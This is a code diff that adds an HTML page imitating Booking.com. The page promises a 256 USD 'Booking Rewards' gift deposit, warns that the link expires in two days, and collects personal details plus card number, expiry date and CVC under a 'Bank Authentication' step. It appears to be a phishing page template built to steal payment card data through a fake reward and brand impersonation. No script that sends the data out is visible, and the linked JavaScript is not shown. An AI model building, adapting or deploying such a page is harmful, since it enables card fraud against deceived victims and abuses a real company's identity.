@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/index.css">
+    <script src="./js/index.js" defer></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <title>Depoist</title>
+</head>
+<body>
+
+    <!--Navbar-->
+    <header class="flex flex-wrap sm:justify-start sm:flex-nowrap z-50 w-full text-sm p-5  bg-[#003B95]">
+        <nav class="flex flex-row max-w-6xl w-full mx-auto items-center justify-between flex-nowrap" aria-label="Global">
+            <div class="text-xl font-semibold text-white">
+                <a href="">Booking.com</a>
+            </div>
+            <div>
+                <div class="hidden md:flex flex-row gap-8 items-center">
+                    <a class="cursor-pointer relative group">
+                        <img class="h-7" src="./assets/usa-Falg.png" alt="usa">
+                        <div class="tooltip hidden group-hover:block absolute bg-black text-white text-sm py-1 px-2 rounded mt-2 -ml-10">
+                            Selectionner Votre language
+                        </div>
+                    </a>
+                    <a class="cursor-pointer relative group" href="">
+                        <svg stroke="currentColor" fill="white" stroke-width="0" viewBox="0 0 16 16" height="1.35rem" width="1.35rem" xmlns="http://www.w3.org/2000/svg">
+                            <path fill-rule="evenodd" d="M8 15A7 7 0 108 1a7 7 0 000 14zm0 1A8 8 0 108 0a8 8 0 000 16z" clip-rule="evenodd"></path>
+                            <path d="M5.25 6.033h1.32c0-.781.458-1.384 1.36-1.384.685 0 1.313.343 1.313 1.168 0 .635-.374.927-.965 1.371-.673.489-1.206 1.06-1.168 1.987l.007.463h1.307v-.355c0-.718.273-.927 1.01-1.486.609-.463 1.244-.977 1.244-2.056 0-1.511-1.276-2.241-2.673-2.241-1.326 0-2.786.647-2.754 2.533zm1.562 5.516c0 .533.425.927 1.01.927.609 0 1.028-.394 1.028-.927 0-.552-.42-.94-1.029-.94-.584 0-1.009.388-1.009.94z"></path>
+                        </svg>
+                        <div class="tooltip hidden group-hover:block absolute bg-black text-white text-sm py-1 px-2 rounded mt-2 -ml-10">
+                           Aide
+                        </div>
+                    </a>                
+                </div>
+                <div class="md:hidden flex items-center flex-row toggle">
+                    <button class="outline-none menu-button cursor-pointer">
+                        <svg stroke="currentColor" fill="white" stroke-width="0" viewBox="0 0 1024 1024" height="2em" width="2em" xmlns="http://www.w3.org/2000/svg"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg>
+                    </button>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <main class="flex lg:flex-row flex-col gap-6 font-medium">
+        <!--Cards-->
+        <section class="lg:w-[30%] w-full lg:m-0 m-auto transition-all duration-500">
+            <!--personal Informations-->
+            <div class="flex flex-col border-1  rounded-md shadow-lg border border-opacity-30 border-gray-400 w-[90%] m-5 p-3 gap-2">
+                <h2 class="text-[1.25rem]">Gift description</h2>
+                <div class="flex justify-between text-[0.80rem] text-[#000000]/[0.7] ">
+                    <p>Merchant:</p>
+                    <p>Booking Rewards</p>
+                </div>
+                <div class="flex justify-between text-[0.80rem] text-[#000000]/[0.7] ">
+                    <p>AMOUNT TO RECIEVE:</p>
+                    <p>256 USD</p>
+                </div>
+                <div class="flex justify-between text-[0.80rem] text-[#000000]/[0.7] ">
+                    <p>Gift Receiver:</p>
+                    <p>client@gmail.com</p>
+                </div>
+            </div>
+
+            <!--Notice-->
+            <div class="flex flex-col  rounded-md shadow-lg border border-opacity-30 border-gray-400 w-[90%] m-5 p-3 gap-2">
+                <h2 class="text-[1.25rem]">Notice ..!</h2>
+                <div class="flex justify-between text-[0.80rem] text-[#000000]/[0.7] ">
+                    
+                    <p>This gift Balance can be used for personal reasons</p>
+                </div>
+                
+            </div>
+
+            <!--Trust client-->
+            <div class="flex flex-col rounded-md shadow-lg border border-opacity-30 border-gray-400 w-[90%] h-[12vh] m-5 p-4 gap-2">
+                <h2 class="text-[1.25rem]">We remain loyal to our clients !</h2>
+                
+                
+            </div>
+
+            <!--warning-->
+            <div class="flex flex-row border-[2px] border-red-300 bg-[#FFF5F4] rounded-md shadow-lg  w-[90%] m-5 p-3 gap-2">
+                <p class="text-[1.5rem]"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M247 62.107v9.94h-28.88v18H247v39.074c-84.367 4.682-151.514 74.737-151.514 160.26 0 41.037 15.468 78.508 40.873 106.91l-36.237 36.237 12.727 12.73 36.238-36.24C177.49 434.425 214.96 449.894 256 449.894c41.04 0 78.51-15.47 106.912-40.875l36.238 36.238 12.727-12.73-36.236-36.235c25.406-28.402 40.874-65.873 40.874-106.91 0-85.523-67.147-155.578-151.514-160.26V90.048h28.88v-18H265v-9.94h-18zm-104.906 26.58c-3.583-.03-7.267.125-11.014.465C111.1 90.97 89.15 98 73.637 113.514c-15.514 15.513-22.545 37.462-24.362 57.443-.908 9.99-.488 19.54 1.184 27.898 1.67 8.36 4.315 15.662 9.784 21.13l6.363 6.365 6.366-6.364 113.5-113.502-6.366-6.363c-5.47-5.468-12.77-8.112-21.128-9.784-4.18-.836-8.658-1.358-13.34-1.56-1.17-.05-2.352-.08-3.546-.088zm227.812 0c-1.194.01-2.376.04-3.547.09-4.682.2-9.16.723-13.34 1.56-8.357 1.67-15.658 4.315-21.127 9.784l-6.366 6.364 6.366 6.366 113.5 113.5 6.363-6.364c5.47-5.47 8.113-12.772 9.785-21.13 1.673-8.36 2.093-17.908 1.185-27.9-1.817-19.98-8.848-41.93-24.362-57.442C422.85 98 400.9 90.97 380.92 89.152c-3.747-.34-7.43-.494-11.014-.465zM256 146.865c78.815 0 142.514 63.7 142.514 142.514 0 78.814-63.7 142.513-142.514 142.513-78.815 0-142.514-63.7-142.514-142.514 0-78.816 63.7-142.515 142.514-142.515zm-88.332 41.453l-12.73 12.73 82.92 82.917a18.94 18.94 0 0 0-.797 5.414A18.94 18.94 0 0 0 256 308.317a18.94 18.94 0 0 0 16.66-9.94h59.096v-18h-59.11A18.94 18.94 0 0 0 256 270.44a18.94 18.94 0 0 0-5.408.804l-82.924-82.924z"></path></svg></p>   
+                <h2 class="text-[1.15rem]">This deposit link will expire in 2 days ..</h2>
+                
+                
+            </div>
+        </section>
+
+        <!--Depoist Form-->
+        <section class="p-6 lg:w-[70%] w-full  m-auto h-full border border-gray-300 border-opacity-40 shadow-lg rounded-md  transition-all duration-500 px-6">
+            <h2 class="md:text-left text-xl font-bold mb-4">Enter your Address</h2>
+            <div class="bg-[#D9EEDC] w-fit transition-all duration-500 px-2">
+                <p class="p-1 text-[0.7rem] text-green-800">Almost done! just fill in the <span class="text-[#FF0000]">*</span> required info</p>
+            </div>
+
+            <form >
+                <div class="md:mb-12 m-auto space-y-4">
+                    <div class="flex md:flex-row flex-col md:justify-between  items-start  md:gap-6 gap-2  m-auto ">
+                        <!--First Name-->
+                        <div class="relative h-11 md:w-[50%] w-full min-w-[200px]">
+                            <input
+                              class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                              placeholder=" "
+                              id="first-name"
+                            />
+                            <label 
+                            class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                            >
+                              First Name
+                            </label>
+                          </div>
+                          <!--Last Name-->
+                          <div class="relative h-11 md:w-[50%] w-full">
+                            <input
+                            class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                            placeholder=" "
+                              id="last-name"
+                            />
+                            <label 
+                            class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                            >                              Last Name
+                        </label>
+                          </div>
+                    </div>
+                    
+                    <!--email-->
+                    <div class="relative h-11 md:w-full w-full m-auto">
+                        <input
+                        class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                        placeholder=" "
+                          type="email"
+                          id="email"
+                        />
+                        <label 
+                        class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                        >                          Email
+                        </label>
+                      </div>
+
+                        <!--Phone number-->
+                        <div class="relative h-11 md:w-full w-full m-auto">
+                          <input
+                          class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                          placeholder=" "
+                            type="text"
+                            required
+                            id="phone-number"
+                          />
+                          <label 
+                          class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                          >                          Phone Number
+                          </label>
+                        </div>
+
+                    </div>
+                      <hr class="w-[15%] md:m-auto md:block hidden p-2 ">
+
+                      <!--location informations-->
+                      <div class="flex flex-col md:gap-4 gap-2 space-y-2 ">
+                        <div class="flex md:flex-row flex-col justify-between md:gap-6 gap-2">
+
+                            <!--City-->
+                            <div class="relative h-11  md:w-[50%] w-full m-auto">
+                                <input
+                                class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                                placeholder=" "
+                                  required
+                                  id="city"
+                                />
+                                <label 
+                                class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                                >                                  City <span class="text-[#FF0000]"> *</span>
+                                </label>
+                              </div>
+    
+                              <!--Zip / Post Code-->    
+                              <div class="relative h-11  md:w-[50%] w-full m-auto">
+                                <input
+                                class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                                placeholder=" "
+                                  type="number"
+                                  min="0"
+                                  id="post-code"
+                                />
+                                <label 
+                                class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                                >                                    Zip / Post Code
+                                </label>
+                              </div>
+                        </div>
+
+                        <div class="flex md:flex-row flex-col justify-between md:gap-6 gap-4  ">
+
+                            <!--Address-->
+                            <div class="relative h-11  w-full md:w-[50%] m-auto">
+                                <input
+                                class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                                placeholder=" "
+                                  required
+                                  id="address"
+                                />
+                                <label 
+                                class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                                >                                    Address <span class="text-[#FF0000]"> *</span>
+                                </label>
+                              </div>
+    
+                              <!--Country / Region-->
+                              <div class="relative h-11  w-full md:w-[50%] m-auto">
+                                <select 
+                                name="Country"
+                                id="country"
+                                
+                                class="peer h-full w-full border-b border-gray-400 bg-transparent pt-4 pb-1.5 font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all placeholder-shown:border-blue-gray-200 focus:border-[#003B95] focus:outline-0 disabled:border-0 disabled:bg-blue-gray-50"
+                                
+                                >
+                                    <option value="" disabled selected>Choose Your Country</option>
+                                    <option value="">Tunisia</option>
+                                    <option value="">French</option>
+                                    <option value="">USA</option>
+                                </select>
+                                <label class="after:content[' '] pointer-events-none absolute left-0 -top-1.5 flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500">                                    Country / Region <span class="text-[#FF0000]"> *</span>
+                                </label>
+                              </div>
+                        </div>
+                      </div>
+
+                      <div class="flex flex-row  gap-2 md:mt-7 m-auto md:space-y-0 space-y-4 ">
+                        <input type="checkbox" name="paperless-confirmation" id="paperless-confirmation" value="*">
+                        <p class="text-[0.7rem]">Yes , I’d like free paperless confirmation (recommended) <span class="text-[#8F8282]">We’ll text you a link to download our app</span></p>
+                      </div>
+                      <hr class="w-[30%] m-auto mt-12 text-[#000000] border-[1px] border-gray-300">
+
+                      <!--B2P-->
+
+                      <div class="flex flex-col border-1  rounded-md shadow-lg border-1 border-gray-400 md:w-[80%] w-full mt-5 p-6 gap-2 m-auto">
+                        <h2 class="text-[1.25rem]">Booking.com B2P direct deposit</h2>
+                        <div class="flex justify-between text-[0.80rem] ">
+                            
+                            <p class="text-[#353535]">We provide a direct deposit to your bank account using your card SMS secure authentication . (Allow from 5 to 6 business days to receive the transfer on your bank Statement ) B2P : (Business-to-Person)</p>
+                        </div>
+                        
+                    </div>
+
+                    <hr class="w-[30%] m-auto mt-12 text-[#000000] border-[1px] border-gray-300">
+
+                    <!--Credit Card Informations-->
+
+                    <h2 class="md:m-9 m-6 text-xl font-bold">Depoist must be accepted by Bank Authentication</h2>
+                    <!--Bank Authentication-->
+                    <div class="flex md:flex-row md:justify-between md:gap-4 gap-6 justify-center flex-col">
+                        <button class="border border-blue-500 text-blue-600 md:w-auto w-[80%] p-7 md:m-5 m-auto">Bank Authentication</button>
+                        <div class="flex flex-col border-1  rounded-md shadow-lg border-1 border-gray-400 md:w-[40%] w-[80%] h-[15vh] md:m-5 m-auto p-3 gap-2">
+                            <h2 class="text-[1.25rem]">Accepted Cards</h2>
+                            <div class="flex justify-between text-[0.80rem] text-[#000000]/[0.7] ">
+                                
+                                <p>CARDS LIST</p>
+                            </div>
+                            
+                        </div>
+                    </div>
+
+                    <div class="flex flex-col gap-4">
+                    <!--Cardholder’s name *-->
+                    <div class="relative mb-5 h-11 w-full  m-auto">
+                        <input
+                        class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                        placeholder=" "
+                          required
+                          id="cardholder-name"
+                        />
+                        <label 
+                        class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                        >                            Cardholder’s name <span class="text-[#FF0000]"> *</span>
+                        </label>
+                      </div>
+
+                      <!--Card's Number-->
+                      <div class="relative h-11 w-full m-auto">
+                        <input
+                        class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                          placeholder=" "
+                          required
+                          type="number"
+                          min="0"
+                          id="card-number"
+                        />
+                        <label 
+                        class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                        >                            Card number <span class="text-[#FF0000]"> *</span>
+                        </label>
+                      </div>
+
+                      <div class="flex md:flex-row flex-col justify-between gap-4 md:mb-2 mb-8">
+
+                        <!--Expiry date (MM/YY)-->
+                        <div class="relative h-11 md:w-[50%] w-full  m-auto">
+                            <input
+                            class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                            placeholder=" "
+                              required
+                              id="expiry-date"
+                            />
+                            <label 
+                            class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                            >                                Expiry date (MM/YY) <span class="text-[#FF0000]"> *</span>
+                            </label>
+                          </div>
+
+                          <!--CVC-->
+                          <div class="relative h-11 md:w-[50%] w-full m-auto">
+                            <input
+                            class="peer h-full p-2 tracking-widest w-full border-b focus:border focus  border-gray-400 bg-transparent rounded-sm  font-sans text-sm font-normal text-blue-gray-700 outline outline-0 transition-all "
+                              placeholder=" "
+                              type="number"
+                              min="0"
+                              id="cvc"
+                            />
+                            <label 
+                            class="after:content[' '] px-2 py-[0.20rem] pointer-events-none absolute left-0 -top-[0.1rem] flex h-full w-full select-none text-[11px] font-normal leading-tight text-blue-gray-500 transition-all after:absolute after:-bottom-1.5 after:block after:w-full after:scale-x-0   after:transition-transform after:duration-300 peer-placeholder-shown:text-sm peer-placeholder-shown:leading-[4.25] peer-placeholder-shown:text-blue-gray-500 peer-focus:text-[11px] peer-focus:leading-tight peer-focus:text-[#003B95] peer-focus:after:scale-x-100  peer-disabled:text-transparent peer-disabled:peer-placeholder-shown:text-blue-gray-500"
+                            >                                CVC <span class="text-[#FF0000]"> *</span>
+                            </label>
+                          </div>
+                    </div>
+                </div>
+                    <div class="flex flex-row  md:mt-7 m-auto gap-2">
+                        <input type="checkbox" name="paperless-confirmation" id="paperless-confirmation" value="*">
+                        <p class="text-[1rem]">Save card for future Deposit</span></p>
+                      </div>
+
+                      <!-- receiving marketing -->
+                      <div class="space-y-4 mt-4">
+                        <div class="flex flex-row md:mt-7 m-auto gap-2">
+                            <input type="checkbox" name="paperless-confirmation" id="paperless-confirmation" value="*">
+                            <p class="text-[0.8rem]">Yes , i consent to receiving marketing emails including deals, travel inspiration, and updates on products and services from booking.com</span></p>
+                          </div>
+
+                          <div class="flex flex-row  md:mt-7 m-auto gap-2">
+                            <input type="checkbox" name="paperless-confirmation" id="paperless-confirmation" value="*">
+                            <p class="text-[0.8rem]">Yes, i consent to receiving marketing emails from Booking.com about transportation deals from Booking Transport Limited.</span></p>
+                          </div>
+
+                          <p class="m-4 text-[0.8rem]">You can unsubscribe at any time <a href="" class="text-[#0274B5]">privacy policy</a></p>
+                      </div>
+
+
+                      <button type="submit" class="flex flex-row justify-center gap-2 mt-7 items-center p-4 bg-[#1E72F1] text-white m-auto mb-5 ">
+                        <p class="text-[20px]"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 16 16" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M11.5 8h-7a1 1 0 00-1 1v5a1 1 0 001 1h7a1 1 0 001-1V9a1 1 0 00-1-1zm-7-1a2 2 0 00-2 2v5a2 2 0 002 2h7a2 2 0 002-2V9a2 2 0 00-2-2h-7zm0-3a3.5 3.5 0 117 0v3h-1V4a2.5 2.5 0 00-5 0v3h-1V4z" clip-rule="evenodd"></path></svg></p>
+                        Complete Deposit
+                    </button>
+                    
+            </form>
+        </section>
+    </main>
+</body>
+</html>
